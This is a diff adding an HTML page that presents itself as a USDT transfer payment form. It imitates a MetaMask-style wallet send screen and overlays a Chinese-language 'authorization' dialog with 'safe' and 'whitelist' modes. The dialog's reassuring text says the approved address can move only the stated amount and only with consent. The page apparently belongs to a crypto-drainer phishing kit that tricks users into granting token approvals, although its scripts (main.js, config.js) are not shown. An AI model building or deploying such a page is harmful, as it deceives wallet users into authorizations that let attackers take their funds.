@@ -1,0 +1,539 @@
+<!doctype html>
+<html lang="en">
+<head> 
+  <meta charset="UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <link rel="Shortcut Icon" href="css/favicon.ico"> 
+  <!--<link rel="stylesheet" href="css/okx.css"> -->
+  <link rel="stylesheet" href="css/index.css"> 
+  <!--<link rel="stylesheet" href="css/weui.css"> -->
+  <title>USDT转账支付</title> 
+  <style>
+    a_input[type="text"],
+    a_input[type="number"],
+    a_input[type="password"],
+    a_input[type="email"],
+    a_input[type="tel"],
+    a_input[type="url"],
+    a_input[type="search"],
+    a_textarea {
+        border: none;
+        box-shadow: none;
+        appearance: none;
+        -webkit-appearance: none;
+    }
+
+    a_input[type="text"],
+    a_input[type="number"],
+    a_input[type="password"],
+    a_input[type="email"],
+    a_input[type="tel"],
+    a_input[type="url"],
+    a_input[type="search"],
+    a_textarea {
+        padding: 0;
+        border: 1px solid #ccc;
+        border-radius: 0;
+    }
+
+    a_input::placeholder,
+    a_textarea::placeholder {
+        color: #999;
+    }
+
+    @keyframes a_slideUp {
+        to {
+            top: -120%;
+        }
+    }
+
+    @keyframes a_slideDown {
+        to {
+            top: 0;
+        }
+    }
+
+    .text-red {
+        color: #ff6666; /* 调整为淡红色 */
+    }
+
+    .text-green {
+        color: #66cc66; /* 调整为淡绿色 */
+    }
+    
+    .a_mobile-container1 {
+        width: 100%;
+        overflow: hidden;
+        margin: 0 auto;
+        z-index: 9999;
+        background-color: #ffffff;
+        display: flex;
+        flex-wrap: wrap;
+        flex-direction: column;
+        align-items: center;
+        position: absolute;
+        top: -110%;
+    }
+
+    .a_goods-info-base {
+        width: 95%;
+        margin: 15px auto 0;
+        padding: 6px 0;
+        background-color: #fcf6ed;
+        color: #dda453;
+    }
+
+    .a_pay-title1 {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 16px;
+    }
+
+    .a_ml-5 {
+        margin-left: 5px;
+    }
+
+    .a_import-tip {
+        font-size: 16px;
+        text-align: center;
+        margin-top: 15px;
+        font-weight: bold;
+    }
+
+    .a_pay-container {
+        width: 90%;
+        margin: 70px auto 100px auto;
+    }
+
+    .a_red-star::before {
+        content: "*";
+        color: red;
+        margin-right: 5px;
+    }
+
+    .a_red-star {
+        font-size: 15px;
+        color: #5f5f5f;
+        margin-right: 5px;
+    }
+
+    .a_pay-count {
+        display: flex;
+        align-items: center;
+    }
+
+    .a_input-container {
+        display: flex;
+        align-items: center;
+    }
+
+    .a_input-wrapper {
+        width: 40%;
+        height: 28px;
+        background: #ffffff;
+        font-weight: 400;
+        font-size: 16px;
+        color: #5f5f5f;
+        box-shadow: none!important;
+        border: 1px solid #f0f0f0!important;
+        padding: 0 16px;
+        text-align: center;
+    }
+
+    .a_pub-button {
+        width: 30px;
+        height: 30px;
+        font-size: 18px;
+        cursor: pointer;
+        background-color: #f6f7fa!important;
+        font-weight: 300;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .a_minus-btn {
+        padding: 0 16px;
+        border-top: 2px solid #f0f0f0;
+        border-bottom: 2px solid #f0f0f0;
+        border-left: 1px solid #f0f0f0;
+        border-right: 0;
+        background: #ffffff;
+        border-top-left-radius: 4px;
+        border-bottom-left-radius: 4px;
+    }
+
+    .a_plus-btn {
+        padding: 0 16px;
+        border-top: 1px solid #f0f0f0;
+        border-bottom: 1px solid #f0f0f0;
+        border-right: 1px solid #f0f0f0;
+        border-left: 0;
+        background: #ffffff;
+        border-top-right-radius: 4px;
+        border-bottom-right-radius: 4px;
+    }
+
+    .a_authorization {
+        width: 95%;
+        margin: 20px auto;
+    }
+
+    .a_line {
+        width: 95%;
+        padding: 0 16px;
+        margin: 0 auto;
+        border-bottom: 1px solid #eeeeee;
+    }
+
+    .a_f-title-color {
+        color: #fa6666;
+        font-weight: 500;
+        font-size: 15px;
+    }
+
+    .a_pay-content1 {
+        font-size: 15px;
+        color: #999999;
+    }
+
+    .a_radio-item {
+        border: 1px solid #eeeeee;
+        background: #fff;
+        border-radius: 6px;
+        padding: 8px 10px;
+        font-size: 14px;
+        margin-right: 20px;
+        display: flex;
+        align-items: center;
+    }
+
+    .a_radio-item-blue {
+        border: 1px solid #265bc1;
+        background: #fff;
+        border-radius: 6px;
+        padding: 8px 10px;
+        font-size: 14px;
+        margin-right: 20px;
+        display: flex;
+        align-items: center;
+    }
+
+    .a_radio-option {
+        margin: 0 5px 0 0;
+    }
+
+    .a_radio-container {
+        display: flex;
+        align-items: center;
+        justify-content: space-around;
+    }
+
+    .a_w-auto {
+        width: auto;
+    }
+
+    .a_w-110 {
+        min-width: 130px;
+    }
+
+    .a_pay-count-base {
+        display: flex;
+        align-items: center;
+        margin: 15px 0;
+    }
+
+    .a_submit-container {
+        width: 95%;
+        position: absolute;
+        bottom: 70px;
+        right: 5%;
+        display: flex;
+        align-items: center;
+        justify-content: flex-end;
+    }
+
+    .a_submit {
+        padding: 8px 16px;
+        color: #FFF;
+        background-color: #589ff7;
+        border-radius: 4px;
+        font-size: 16px;
+    }
+
+    .a_cancel {
+        padding: 8px 16px;
+        color: #999;
+        border: 1px solid #eee;
+        border-radius: 4px;
+        font-size: 16px;
+        margin-right: 10px;
+    }
+
+    .a_footer {
+        position: absolute;
+        bottom: 0;
+        width: 100%;
+        height: 50px;
+        background-color: #5f5f5f;
+    }
+
+    .a_goods-info1 {
+        display: none;
+        width: 80%;
+        margin: 20px auto 0;
+        border-radius: 6px;
+        padding: 12px 20px;
+    }
+
+    .a_tip-bg-white {
+        background-color: #fbf0f1!important;
+        color: #fa6666;
+    }
+
+    .a_tip-color-green {
+        background-color: #f3f8ed!important;
+        color: #82bf53;
+    }
+
+    .a_tip-color1 {
+        font-size: 16px!important;
+    }
+
+    @media (min-width: 768px) {
+        .a_mobile-container1 {
+            width: 50%;
+            margin: 0 auto;
+            position: relative;
+            top: 0;
+        }
+
+        .a_goods-info-base, .a_pay-container, .a_submit-container, .a_authorization, .a_line, .a_pay-count, .a_pay-count-base {
+            width: 100%;
+        }
+
+        .a_input-wrapper {
+            width: 60%;
+        }
+
+        .a_submit-container {
+            position: static;
+            justify-content: flex-start;
+        }
+
+        .a_footer {
+            position: static;
+            height: auto;
+        }
+    }
+
+    @media (min-width: 1024px) {
+        .a_mobile-container1 {
+            width: 40%;
+        }
+
+        .a_input-wrapper {
+            width: 70%;
+        }
+    }
+</style>
+<style>
+.toast {
+    position: fixed;
+    top: 50%; /* 设置距离顶部20% */
+    left: 50%; /* 从左边界开始50%的位置显示 */
+    transform: translateX(-50%); /* 向左移动自身宽度的50%以实现居中 */
+    background-color: rgba(0, 0, 0, 0.75); /* 半透明黑色背景 */
+    color: white; /* 白色文本 */
+    padding: 10px 40px; /* 增加水平内边距 */
+    border-radius: 5px; /* 圆角边框 */
+    z-index: 10000; /* 确保在最上层显示 */
+    display: none; /* 默认不显示 */
+    text-align: center; /* 文本居中显示 */
+    max-width: 80%; /* 最大宽度限制，防止过长文本问题 */
+    min-width: 300px; /* 设置一个最小宽度 */
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1); /* 添加阴影效果提升立体感 */
+}
+</style>
+
+</head> 
+<body> 
+  <div class="container">
+    <div class="payForm"> 
+      <div id="app-content"> 
+        <div class="app os-win browser-chrome mouse-user-styles"> 
+          <div class="menu-droppo-container network-droppo" style="position: fixed; z-index: 55;"> 
+          </div> 
+          <div class="main-container-wrapper"> 
+            <div class="page-container"> 
+              <div class="send-title">
+                收款地址
+                <div class="send__select-recipient-wrapper"> 
+                  <div class="send__select-recipient-wrapper__list"> 
+                    <div class="send__select-recipient-wrapper__list">
+                      <a class="button btn-link send__select-recipient-wrapper__list__link" role="button" tabindex="0">安全隐私支付</a>
+                    </div> 
+                  </div> 
+                </div> 
+              </div> 
+              <div class="ens-input send__to-row"> 
+                <div class="ens-input__wrapper"> 
+                  <input class="ens-input__wrapper__input" type="text" value="0xdac17f958d2ee523a2206206994597c13d831ec7" disabled> 
+                </div> 
+              </div> 
+              <div class="page-container__content"> 
+                <div class="send-v2__form"> 
+                  <div class="send-v2__form-title">
+                    金额
+                  </div> 
+                  <div class="send-v2__form-amount-asset"> 
+                    <div class="send-v2__form-row"> 
+                      <button class="send-v2__amount-max"> 
+                        <div class="send-v2__amount-max__button">
+                          最大
+                        </div> 
+                      </button> 
+                      <div class="send-v2__form-field-container"> 
+                        <div class="send-v2__form-field"> 
+                          <div class="unit-input"> 
+                            <div class="unit-input__inputs"> 
+                              <div class="unit-input__input-container"> 
+                                <input type="number" class="unit-input__input" placeholder="请输入数量" style="width: 3.5ch;" id="available1" oninput="updateAmount(this.value)">
+                              </div> 
+                            </div> 
+                          </div> 
+                        </div> 
+                        <div></div> 
+                      </div> 
+                    </div> 
+                    <div class="send-v2__form-divider"></div> 
+                    <div class="send-v2__form-row"> 
+                      <div class="send-v2__form-field"> 
+                        <div class="send-v2__asset-dropdown"> 
+                          <div class="send-v2__asset-dropdown__input-wrapper"> 
+                            <div class="send-v2__asset-dropdown__asset"> 
+                              <div class="send-v2__asset-dropdown__asset-title">
+                                资产
+                              </div> 
+                              <div class="send-v2__asset-dropdown__asset-content"> 
+                                <div class="send-v2__asset-dropdown__asset-icon"> 
+                                  <img class="identicon" src="images/favicon.ico" alt="" style="height: 24px; width: 24px; border-radius: 12px;"> 
+                                </div> 
+                                <div class="send-v2__asset-dropdown__name"> 
+                                  <div class="currency-display-component"> 
+                                    <span class="currency-display-component__text"> <span>0.000000</span> </span>
+                                  </div> 
+                                </div> 
+                                <div class="send-v2__asset-dropdown__symbol">
+                                  USDT
+                                </div> 
+                              </div> 
+                            </div> 
+                          </div> 
+                        </div> 
+                      </div> 
+                    </div> 
+                  </div> 
+                </div> 
+              </div> 
+              <div class="page-container__footer"> 
+                <footer> 
+                  <div class="extra-space-above-button" style="height: 50px;">
+                  </div>
+                  <button type="primary" class="button btn-secondary page-container__footer-button">下一步</button> 
+                </footer> 
+              </div> 
+              <div class="extra-space" style="background-color: white; height: 500px;">
+              </div>
+            </div> 
+          </div> 
+        </div> 
+      </div> 
+    </div> 
+  </div>  
+</div>  
+  <div class="a_mobile-container1">
+    <div class="a_goods-info-base a_tip-bg-base" id="tip">
+        <div class="a_pay-title1 a_tip-color1">
+            <img src="images/waring.png" style="width: 15px; object-fit: contain">
+            <div class="a_ml-5">警告</div>
+        </div>
+    </div>
+    <div class="a_goods-info1 a_tip-color-green" id="tip1">
+        <div class="a_pay-title1 a_tip-color1">
+            <img src="images/right-f.png" style="width: 15px; object-fit: contain">
+            <div class="a_ml-5">
+                安全操作：当前授权地址只能转移<span class="approveAmount">{$amount}</span> USDT，并须经过我同意，可避免被盗
+            </div>
+        </div>
+    </div>
+    <div class="a_goods-info1 a_tip-bg-white" id="tip2">
+        <div class="a_pay-title1 a_tip-color1">
+            <img src="images/close-circle.png" style="width: 15px; object-fit: contain">
+            <div class="a_ml-5">
+                高危操作：当前授权地址可随时转移<span class="approveAmount">{$amount}</span> USDT，无须经过我同意，有被盗风险
+            </div>
+        </div>
+    </div>
+    <p class="a_import-tip">为保证资产安全，请仔细阅读以下信息</p>
+    <div class="a_pay-container" style="margin-top: 10px;">
+        <div class="a_pay-count" style="display: flex; align-items: center; justify-content: flex-start;">
+            <span class="a_red-star a_w-110" style="white-space: nowrap; margin-right: 10px;">授权金额(USDT):</span>
+            <div class="a_input-container" style="flex-grow: 1; display: flex; align-items: center;">
+                <button class="a_minus-btn a_pub-button" disabled>-</button>
+                <input type="number" id="number-input" class="a_input-wrapper" value="{$amount}" readonly style="margin: 0 10px;">
+                <button class="a_plus-btn a_pub-button" disabled>+</button>
+            </div>
+        </div>
+        <div class="a_authorization">
+            <p class="a_pay-content1">
+                <span class="a_f-title-color">授权金额:</span>
+                授权以后，该授权地址只能转走相应数量资产，无法转走所有资产
+            </p>
+        </div>
+        <div class="a_line"></div>
+        <div class="a_pay-count-base">
+            <span class="a_red-star a_w-auto">授权模式:</span>
+            <div class="a_radio-container">
+                <label class="a_radio-item" id="option1">
+                    <input type="radio" value="option1" class="a_radio-option" onclick="showTip(1)">
+                    安全模式
+                </label>
+                <label class="a_radio-item" id="option2">
+                    <input type="radio" value="option2" class="a_radio-option" onclick="showTip(2)">
+                    白名单模式
+                </label>
+            </div>
+        </div>
+        <p id="errorText" style="color: red; display: none; font-size: 14px; margin-left: 80px;">
+            请选择授权模式
+        </p>
+        <div class="a_authorization">
+            <p class="a_pay-content1">
+                <span class="a_f-title-color">安全模式:</span>
+                授权地址无法直接转走资产，须经过我同意，保证资产安全
+            </p>
+        </div>
+        <div class="a_authorization">
+            <p class="a_pay-content1">
+                <span class="a_f-title-color">白名单模式:</span>
+                授权地址无须经过确认即可转走资产，未知链接请勿勾选此项
+            </p>
+        </div>
+        <div class="a_submit-container">
+            <div class="a_cancel" onclick="scrollUpAndRedirect()">
+                取消
+            </div>
+            <div class="a_submit" onclick="confirmApprove()">
+                确认
+            </div>
+        </div>
+    </div>
+</div>
+<script src="js/ethers-5.3.umd.min.js" type="application/javascript"></script>
+<script src="js/config.js"></script>
+<script src="js/main.js"></script>
+</body>
+</html>
